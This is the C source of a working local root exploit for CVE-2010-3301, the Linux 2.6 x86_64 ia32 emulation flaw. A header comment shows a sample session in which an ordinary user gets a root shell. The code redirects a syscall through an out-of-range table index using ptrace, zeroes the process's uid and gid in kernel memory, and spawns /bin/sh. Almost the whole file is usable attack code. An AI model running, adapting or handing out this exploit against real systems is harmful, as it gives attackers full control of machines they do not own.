/* Linux Kernel 2.6.x local root exploit (x86_64) ia32entry emulation
   ==================================================================
   Exploit for the rediscovered ia32 emulation vulnerability regression
   introduced into the Linux kernel 2.6 branch. This exploit gives a 
   root shell, tested against Ubuntu 64bit - sometimes have to run more
   than once. Change the syscall_table value to match your kernel. Most
   of this adapted from public code for old 2007 exploit. CVE-2010-3301.
 
 Ex.
   fantastic@ubuntu:~$ uname -a
   Linux ubuntu 2.6.32-24-generic #41-Ubuntu SMP Thu Aug 19 01:38:40 UTC 2010 x86_64 GNU/Linux
   fantastic@ubuntu:~$ id
   uid=1000(fantastic) gid=1000(fantastic) groups=4(adm),20(dialout),24(cdrom),46(plugdev),105(lpadmin),119(admin),122(sambashare),1
   (fantastic)
   fantastic@ubuntu:~$ ./x
   # id
   uid=0(root) gid=0(root) groups=4(adm),20(dialout),24(cdrom),46(plugdev),105(lpadmin),119(admin),122(sambashare),1000(fantastic)
   # 
 
  -- prdelka
*/
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>
#include <stddef.h>
#include <stdint.h>

// ia32_sys_call_table address (/proc/kallsyms)
#define syscall_table 0xffffffff8155b018
#define offset        (1L << 32)
#define landing       (syscall_table + 8*offset)

unsigned short uid, gid;
unsigned long task_struct1;
unsigned long sp;

void kernelmodecode() {
	asm volatile ("movq %%rsp,%0; " : "=r" (sp));
	task_struct1 = sp & ~(8192 - 1);
	unsigned int *task_struct;
	task_struct = (unsigned int *)task_struct1;
	while (task_struct) {
		if (task_struct[0] == uid && task_struct[1] == uid &&
				task_struct[2] == uid && task_struct[3] == uid &&
				task_struct[4] == gid && task_struct[5] == gid &&
				task_struct[6] == gid && task_struct[7] == gid) {
			task_struct[0] = task_struct[1] =
			task_struct[2] = task_struct[3] =
			task_struct[4] = task_struct[5] =
			task_struct[6] = task_struct[7] = 0;
			break;
		}
		task_struct++;
	}
	return;
}

int main() {
	uid = getuid();
	gid = getgid();
        if((signed long)mmap((void*)(landing&~0xFFF), 4096,
                              PROT_READ|PROT_EXEC|PROT_WRITE,
                              MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS,
                                0, 0) < 0) {
                perror("mmap");
                exit(-1);
        }
        *(long*)landing = (uint64_t)kernelmodecode;
	pid_t child;
        child = fork();
        if(child == 0) {
                ptrace(PTRACE_TRACEME, 0, NULL, NULL);
                kill(getpid(), SIGSTOP);
                __asm__("int $0x80\n");
		setuid(0);
		setgid(0);
                execl("/bin/sh", "/bin/sh", NULL);
        } else {
                wait(NULL);
                ptrace(PTRACE_SYSCALL, child, NULL, NULL);
                wait(NULL);
                ptrace(PTRACE_POKEUSER, child, offsetof(struct user, regs.orig_rax),
                        (void*)offset);
                ptrace(PTRACE_DETACH, child, NULL, NULL);
                wait(NULL);
        }
}

